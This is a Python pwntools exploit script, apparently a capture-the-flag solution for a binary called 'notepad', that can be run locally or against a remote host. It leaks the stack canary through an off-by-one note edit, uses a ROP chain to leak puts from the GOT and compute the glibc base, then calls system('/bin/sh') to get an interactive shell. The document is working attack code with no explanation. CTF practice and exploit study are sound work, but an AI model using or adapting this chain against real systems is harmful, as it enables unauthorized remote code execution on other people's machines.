#!/usr/bin/env python3

from pwn import context, log, p64, remote, sys, u64

context.binary = 'notepad'
elf = context.binary


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'>>> ', b'2')
    p.sendlineafter(b'>>> ', b'0')
    p.sendlineafter(b'>>> ', b'A' * 127)

    p.sendlineafter(b'>>> ', b'2')
    p.sendlineafter(b'>>> ', b'127')
    p.sendlineafter(b'>>> ', b'B' * 10)

    p.sendlineafter(b'>>> ', b'1')
    note = p.recvline()
    canary = u64(b'\0' + note.split(b'B' * 10)[1][:7])
    log.info(f'Canary: {hex(canary)}')

    pop_rdi_ret_addr = 0x40141b

    payload  = b'B' * 9
    payload += p64(canary)
    payload += p64(0)
    payload += p64(pop_rdi_ret_addr)
    payload += p64(elf.got.puts)
    payload += p64(elf.plt.puts)
    payload += p64(elf.sym.main)

    p.sendlineafter(b'>>> ', b'2')
    p.sendlineafter(b'>>> ', b'127')
    p.sendlineafter(b'>>> ', payload)

    p.sendlineafter(b'>>> ', b'3')
    puts_addr = u64(p.recvline().strip(b'\n').ljust(8, b'\0'))
    log.info(f'Leaked puts() address: {hex(puts_addr)}')

    p.sendlineafter(b'>>> ', b'2')
    p.sendlineafter(b'>>> ', b'0')
    p.sendlineafter(b'>>> ', b'A' * 127)

    puts_offset   = 0x080ed0  # 0x084420 
    system_offset = 0x050d60  # 0x052290
    bin_sh_offset = 0x1d8698  # 0x1b45bd

    glibc_base_addr = puts_addr - puts_offset
    log.info(f'Glibc base address: {hex(glibc_base_addr)}')

    system_addr = glibc_base_addr + system_offset
    bin_sh_addr = glibc_base_addr + bin_sh_offset

    payload  = b'B' * 9
    payload += p64(canary)
    payload += p64(0)
    payload += p64(pop_rdi_ret_addr)
    payload += p64(bin_sh_addr)
    payload += p64(pop_rdi_ret_addr + 1)
    payload += p64(system_addr)

    p.sendlineafter(b'>>> ', b'2')
    p.sendlineafter(b'>>> ', b'127')
    p.sendlineafter(b'>>> ', payload)

    p.sendlineafter(b'>>> ', b'3')
    p.interactive()


if __name__ == '__main__':
    main()
